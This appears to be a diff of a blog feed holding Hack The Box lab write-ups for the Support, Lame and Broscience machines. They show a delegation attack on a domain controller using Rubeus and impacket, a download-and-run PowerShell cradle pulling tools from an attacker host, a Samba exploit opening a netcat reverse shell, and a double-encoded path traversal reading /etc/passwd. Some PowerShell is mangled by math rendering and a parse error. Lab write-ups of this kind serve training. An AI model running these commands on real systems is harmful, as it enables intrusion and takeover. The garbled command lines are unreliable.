+<img src="/_resources/96c7694e391b43329ebf99d886688bd5.png" /><br />
+We add a connection by clicking in the Connections window:<br />
+<img src="/_resources/cb7250a1a07845979de5219b3d4987ad.png" /><br />
+<img src="/_resources/05775da73b44428fa40322d9262b3b61.png" /><br />
+Now we have output:<br />
+<img src="/_resources/bb21a6fd93be4032ae51dad0d888a0ab.png" /></p>
+<p>Since we know that a short path the DC is the support account, we can look at the info for that account. We find a plaintext password there:<br />
+<img src="/_resources/408a1b12450f4a12a5eeecb48cb06659.png" /></p>
+<p>support:Ironside47pleasure40Watchful</p>
+<p>We know that user has remote access, so we can use evil-winrm to access a shell on the machine:<br />
+evil-winrm -u support -p Ironside47pleasure40Watchful -i support.htb<br />
+<img src="/_resources/484c07e3e70d4c5ba414138dc60d44ae.png" /></p>
+<p>In Bloodhound we mark the support user as owned.<br />
+Looking at the Node info on the support user, under the Outbound Object Control, and then Group Delegated Object Control, we can see what this user has rights to do on the DC:<br />
+<img src="/_resources/39f37902c24c4a06827158c1ff95dd1b.png" /></p>
+<p>Because the group that support belongs to has 'generic all' rights, we can find a Privilege escalation by right clicking on the 'generic all' then selecting help, and seeing the Abuse Info. Details for an attack are laid out in detail, and all we need to do is follow the steps therein.<br />
+<img src="/_resources/86f860f1c2634fcc80c587f351526d4e.png" /><br />
+According to the instructions we need Rubeus, Powerview/Powersploit, and Powermad.</p>
+<p>What the attack allows us to do is create a new machine then use that machine to act as a machine with higher privileges.<br />
+We need to download these:<br />
+<a title="https://github.com/Kevin-Robertson/Powermad" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a><br />
+<a title="https://github.com/Flangvik/SharpCollection" href="https://github.com/Flangvik/SharpCollection">https://github.com/Flangvik/SharpCollection</a> (for Rubeus)<br />
+and we already had PowerView.ps1<br />
+We use curl and powershell IEX to execute the files on the evil-winrm session:<br />
+IEX(New-Object Net.WebClient).downloadString('<a title="http://10.10.14.6/Powermad.ps1" href="http://10.10.14.6/Powermad.ps1">http://10.10.14.6/Powermad.ps1</a>')</p>
+<p><img src="/_resources/cba8a9abc392470593efa73b64c5fcac.png" /></p>
+<p>The instructions for the attack are as follows:<br />
+New-MachineAccount -MachineAccount attackersystem -Password <span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>C</mi><mi>o</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>T</mi><mi>o</mi><mo>−</mo><mi>S</mi><mi>e</mi><mi>c</mi><mi>u</mi><mi>r</mi><mi>e</mi><mi>S</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><msup><mi>g</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>S</mi><mi>u</mi><mi>m</mi><mi>m</mi><mi>e</mi><mi>r</mi><mn>2018</mn><msup><mo stretchy="false">!</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>−</mo><mi>A</mi><mi>s</mi><mi>P</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>T</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>−</mo><mi>F</mi><mi>o</mi><mi>r</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em">v</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord mathnormal" style="margin-right:0.13889em">tT</span><span class="mord mathnormal">o</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em"></span><span class="mord mathnormal" style="margin-right:0.05764em">S</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">u</span><span class="mord mathnormal">re</span><span class="mord mathnormal">St</span><span class="mord mathnormal" style="margin-right:0.02778em">r</span><span class="mord mathnormal">in</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em"><span style="top:-3.063em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em">S</span><span class="mord mathnormal">u</span><span class="mord mathnormal">mm</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord">2018</span><span class="mclose"><span class="mclose">!</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em"><span style="top:-3.063em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.01968em">Pl</span><span class="mord mathnormal">ain</span><span class="mord mathnormal" style="margin-right:0.13889em">T</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord mathnormal" style="margin-right:0.13889em">F</span><span class="mord mathnormal">orce</span><span class="mclose">)</span></span></span></span></span>ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid<br />
+<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>D</mi><mo>=</mo><mi>N</mi><mi>e</mi><mi>w</mi><mo>−</mo><mi>O</mi><mi>b</mi><mi>j</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>S</mi><mi>e</mi><mi>c</mi><mi>u</mi><mi>r</mi><mi>i</mi><mi>t</mi><mi>y</mi><mi mathvariant="normal">.</mi><mi>A</mi><mi>c</mi><mi>c</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>C</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>l</mi><mi mathvariant="normal">.</mi><mi>R</mi><mi>a</mi><mi>w</mi><mi>S</mi><mi>e</mi><mi>c</mi><mi>u</mi><mi>r</mi><mi>i</mi><mi>t</mi><mi>y</mi><mi>D</mi><mi>e</mi><mi>s</mi><mi>c</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>t</mi><mi>o</mi><mi>r</mi><mo>−</mo><mi>A</mi><mi>r</mi><mi>g</mi><mi>u</mi><mi>m</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>L</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">"</mi><mi>O</mi><mo>:</mo><mi>B</mi><mi>A</mi><mi>D</mi><mo>:</mo><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">;</mo><mo separator="true">;</mo><mi>C</mi><mi>C</mi><mi>D</mi><mi>C</mi><mi>L</mi><mi>C</mi><mi>S</mi><mi>W</mi><mi>R</mi><mi>P</mi><mi>W</mi><mi>P</mi><mi>D</mi><mi>T</mi><mi>L</mi><mi>O</mi><mi>C</mi><mi>R</mi><mi>S</mi><mi>D</mi><mi>R</mi><mi>C</mi><mi>W</mi><mi>D</mi><mi>W</mi><mi>O</mi><mo separator="true">;</mo><mo separator="true">;</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em"></span><span class="mord mathnormal" style="margin-right:0.05764em">S</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em"></span><span class="mord mathnormal" style="margin-right:0.10903em">N</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em">w</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal" style="margin-right:0.02778em">O</span><span class="mord mathnormal" style="margin-right:0.05724em">bj</span><span class="mord mathnormal">ec</span><span class="mord mathnormal" style="margin-right:0.05764em">tS</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em">y</span><span class="mord">.</span><span class="mord mathnormal">A</span><span class="mord mathnormal">ccess</span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ro</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.00773em">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05764em">wS</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em">yDescr</span><span class="mord mathnormal">i</span><span class="mord mathnormal">pt</span><span class="mord mathnormal" style="margin-right:0.02778em">or</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em">r</span><span class="mord mathnormal">gu</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">L</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord">"</span><span class="mord mathnormal" style="margin-right:0.02778em">O</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em"></span><span class="mord mathnormal" style="margin-right:0.05017em">B</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">;;</span><span class="mspace" style="margin-right:0.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:0.07153em">CC</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em">CS</span><span class="mord mathnormal" style="margin-right:0.13889em">W</span><span class="mord mathnormal" style="margin-right:0.13889em">RP</span><span class="mord mathnormal" style="margin-right:0.13889em">W</span><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mord mathnormal" style="margin-right:0.13889em">T</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em">OCRS</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mord mathnormal" style="margin-right:0.07153em">RC</span><span class="mord mathnormal" style="margin-right:0.13889em">W</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mord mathnormal" style="margin-right:0.13889em">W</span><span class="mord mathnormal" style="margin-right:0.02778em">O</span><span class="mpunct">;;;</span></span></span></span></span>(<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>m</mi><mi>p</mi><mi>u</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>S</mi><mi>i</mi><mi>d</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">"</mi></mrow><annotation encoding="application/x-tex">ComputerSid))"
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">m</span><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord mathnormal" style="margin-right:0.05764em">S</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mclose">))</span><span class="mord">"</span></span></span></span></span>SDBytes = New-Object byte[] (<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>D</mi><mi mathvariant="normal">.</mi><mi>B</mi><mi>i</mi><mi>n</mi><mi>a</mi><mi>r</mi><mi>y</mi><mi>L</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">SD.BinaryLength)
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord mathnormal" style="margin-right:0.05764em">S</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.05017em">B</span><span class="mord mathnormal">ina</span><span class="mord mathnormal" style="margin-right:0.03588em">ry</span><span class="mord mathnormal">L</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em">g</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span></span>SD.GetBinaryForm($SDBytes, 0)<br />
+Get-DomainComputer <span><div>KaTeX parse error: Expected '}', got 'EOF' at end of input: …otheridentity'=</div></span>SDBytes}</p>
+<p>.\Rubeus.exe hash /password:Summer2018!<br />
+<img src="/_resources/f55e7a5e8ea448d288aa5f9c30ab275e.png" /></p>
+<p>.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt</p>
+<p><img src="/_resources/c01742fc0dcc42bba7c121a377bfb270.png" /></p>
+<p>Although we had some errors, we got a kerberos ticket:<br />
+<img src="/_resources/0f90461560ff4677b1b3fc08c4ad3e9e.png" /><br />
+<img src="/_resources/08da5f52d8644ff7bc76c03dc4b86a01.png" /><br />
+<img src="/_resources/5fc4bead2e2e48a2951728b02e1ceaeb.png" /></p>
+<p>We then copy the ticket to our machine, and use impacket to login to the machine using the ticket:<br />
+First we need to transform the format from base64, then use impacket's ticketConverter.py to change the format into a linux based file:<br />
+base64 -d ticket.kirbi.b64 &gt; ticket.kirbi<br />
+ticketConverter.py ticket.kirbi ticket.ccache<br />
+<img src="/_resources/7c9181ee5ecd41469e99c21da2f44697.png" /></p>
+<p><span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>a</mi><mi>w</mi><mi>B</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mo>=</mo><mi>G</mi><mi>e</mi><mi>t</mi><mo>−</mo><mi>D</mi><mi>o</mi><mi>m</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>C</mi><mi>o</mi><mi>m</mi><mi>p</mi><mi>u</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>D</mi><mi>C</mi><mo>−</mo><mi>P</mi><mi>r</mi><mi>o</mi><mi>p</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>e</mi><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>m</mi><mi>s</mi><mi>d</mi><mi>s</mi><mo>−</mo><mi>a</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>d</mi><mi>t</mi><mi>o</mi><mi>a</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>n</mi><mi>b</mi><mi>e</mi><mi>h</mi><mi>a</mi><mi>l</mi><mi>f</mi><mi>o</mi><mi>f</mi><mi>o</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>t</mi><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mi>e</mi><mi>l</mi><mi>e</mi><mi>c</mi><mi>t</mi><mo>−</mo><mi>e</mi><mi>x</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi>m</mi><mi>s</mi><mi>d</mi><mi>s</mi><mo>−</mo><mi>a</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>d</mi><mi>t</mi><mi>o</mi><mi>a</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>n</mi><mi>b</mi><mi>e</mi><mi>h</mi><mi>a</mi><mi>l</mi><mi>f</mi><mi>o</mi><mi>f</mi><mi>o</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>t</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal" style="margin-right:0.00773em">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05017em">wB</span><span class="mord mathnormal" style="margin-right:0.03588em">y</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em"></span><span class="mord mathnormal">G</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">Do</span><span class="mord mathnormal">main</span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">m</span><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em">erD</span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em"></span><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em"><span style="top:-3.063em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal">d</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em">ll</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em">w</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">nb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">ha</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em"><span style="top:-3.063em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal">d</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em">ll</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em">w</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">nb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">ha</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em">y</span></span></span></span></span>Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0</p>
+<p>.\Rubeus.exe hash /password:Summer2018! /user:attackersystem$ /domain:support.htb</p>
+<p>KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass</p>
+<p>Now we have an nt system shell:<br />
+<img src="/_resources/18971d03c6f541a9b79e3c024a3eac3c.png" /></p>
+<p>We get the root.txt<br />
+1d8c922ee321c6e7843d9c43dd91821c</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[HTB Lame]]></title>
+            <guid>6ffaa09322f94be4bde93a496d379f17</guid>
+            <pubDate>Mon, 27 Feb 2023 22:00:30 GMT</pubDate>
+            <content:encoded><![CDATA[<p>We start with a scan:<br />
+nmap -Pn -sC -sV -oA nmap/initial 10.10.10.3<br />
+<img src="/_resources/c567a401c69b410fbd19a8e80dd635aa.png" /></p>
+<p>We see an ftp server with anonymous login, and smb server.</p>
+<p>We run a full port scan and find an additional port:<br />
+nmap -Pn -sC -sV -p- -oA nmap/full 10.10.10.3<br />
+<img src="/_resources/29486510bff3417088380bbee60ea40f.png" /></p>
+<p>We also see a FQDN for the machine:<br />
+<img src="/_resources/f535a120134d442a8edfba0408b69e08.png" /></p>
+<p>The ftp server appears to be empty:<br />
+<img src="/_resources/06ac5ef26bf144938b4132efceb869c8.png" /></p>
+<p>We use crackmapexec smb 10.10.10.3 -u "" -p "" --shares:<br />
+<img src="/_resources/9acafc16bda74946b47704f3f77a1515.png" /></p>
+<p>There is apparently an exploit for Samba v3.0.20:<br />
+<a title="https://www.exploit-db.com/exploits/16320" href="https://www.exploit-db.com/exploits/16320">https://www.exploit-db.com/exploits/16320</a><br />
+<a title="https://github.com/amriunix/CVE-2007-2447" href="https://github.com/amriunix/CVE-2007-2447">https://github.com/amriunix/CVE-2007-2447</a><br />
+That one doesn't work, but this one does:<br />
+<a title="https://github.com/Ziemni/CVE-2007-2447-in-Python" href="https://github.com/Ziemni/CVE-2007-2447-in-Python">https://github.com/Ziemni/CVE-2007-2447-in-Python</a></p>
+<p>We execute the script and get a shell:<br />
+ython3 smbExploit.py 10.10.10.3 'nc -e /bin/sh 10.10.14.6 1337'</p>
+<p><img src="/_resources/f7f72650c21546abada3279a8896db59.png" /><br />
+63bd7d21376b0fc1c57e34ebc4e1529f<br />
+<img src="/_resources/29110d9ff1be44c7a2473fd8503a69a1.png" /><br />
+f450f84717bc3962ad83162be66f6b73</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Ambassador]]></title>
             <guid>aa7840ad61a7424ba3d9a32bbbec24d7</guid>
             <pubDate>Mon, 27 Feb 2023 16:30:30 GMT</pubDate>
             <content:encoded><![CDATA[<p>We start with a scan:<br />
@@ -71,6 +550,210 @@ We look on github and find an exploit for this:<br />
 <p>We get a reverse shell, and then get the root.txt:<br />
 <img src="/_resources/b96e87c34bf94d8fa9e35d5aaf7ae265.png" /><br />
 bf4b047415fd875ff672ddddcaa3cebd</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[HTB Broscience]]></title>
+            <guid>d89adfa3c1b5434da1cf0cec5133d129</guid>
+            <pubDate>Tue, 14 Feb 2023 02:53:28 GMT</pubDate>
+            <content:encoded><![CDATA[<p>We run an initial scan against the target :10.10.11.195</p>
+<p>We find the domain is broscience.htb and add that to the /etc/hosts file and run the scan again:<br />
+nmap -sC -sV -oA nmap/initial 10.10.11.195<br />
+<img src="/_resources/5b632ad47df145f7bee998e9fae9c232.png" /></p>
+<p>We run nikto against the site while we check it out:<br />
+nikto -h <a title="https://broscience.htb" href="https://broscience.htb">https://broscience.htb</a><br />
+<img src="/_resources/2a107e97cbd24ce3861c17bd0abef775.png" /></p>
+<p>We visit the site and look at the certificate since it directs us to the site in port 443:<br />
+<img src="/_resources/738cdf5f0f2847be8dc107c39445315d.png" /></p>
+<p>We see an email address so we have a username at least.<br />
+The site appears to be a blog:<br />
+<img src="/_resources/5a9fb534e78f4dd8b25a6f25f60379f1.png" /></p>
+<p>There is a login.php page, and we can view all the users from the user.php?id= paramater.</p>
+<p>We can create a new user, but cannot login without validating the email account.</p>
+<p>The nikto scan showed us the <a title="https://broscience.htb/includes/" href="https://broscience.htb/includes/">https://broscience.htb/includes/</a> folder which has a file img.php that gives us an error when we open it:<br />
+<img src="/_resources/f20f9ee76b2e4dccbbc32ae8b8c67fa7.png" /></p>
+<p>This tells us we can use the ?path= parameter.</p>
+<p>We use /etc/passwd and get an error:<br />
+<img src="/_resources/c13b4d1419e04b05889e0fff767851de.png" /><br />
+Let's try web encoding using burpsuite<br />
+<a title="https://www.url-encode-decode.com/" href="https://www.url-encode-decode.com/">https://www.url-encode-decode.com/</a></p>
+<p>We encode once, and we get the same error. We double encode, and we get no errors:<br />
+..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd<br />
+<img src="/_resources/c9bf595bc93a4199b129f0490a4cf49d.png" /></p>
+<p>We read the source code for the php file we're using to see if we can get a hint at what we're not supposed to look for:<br />
+..%252F..%252F..%252F..%252F..%252F..%252Fvar%252Fwww%252Fhtml%252Fincludes%252Fimg.php</p>
